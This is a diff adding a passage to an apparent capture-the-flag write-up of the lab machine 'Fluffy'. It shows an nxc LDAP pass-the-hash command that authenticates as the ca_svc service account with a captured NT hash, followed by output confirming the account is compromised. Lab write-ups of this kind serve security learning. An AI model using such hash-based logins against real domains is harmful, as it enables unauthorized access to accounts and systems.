@@ -382,3 +382,13 @@ dns.resolver.NXDOMAIN: The DNS query name does not exist: dc01.fluffy.htb.
 ```
 So there is a cleanup script running so after adding the user to the group and checking i had disappeared so i had to re-add myself then quickly run this command
 
+```python
+nxc ldap dc01.fluffy.htb -u ca_svc -H ca0f4f9e9eb8a092addf53bb03fc98c8                                   
+LDAP        10.129.232.88   389    DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:fluffy.htb) (signing:None) (channel binding:Never)
+LDAP        10.129.232.88   389    DC01             [+] fluffy.htb\ca_svc:ca0f4f9e9eb8a092addf53bb03fc98c8 
+```
+This user has been compromised
+
+```python
+
+```
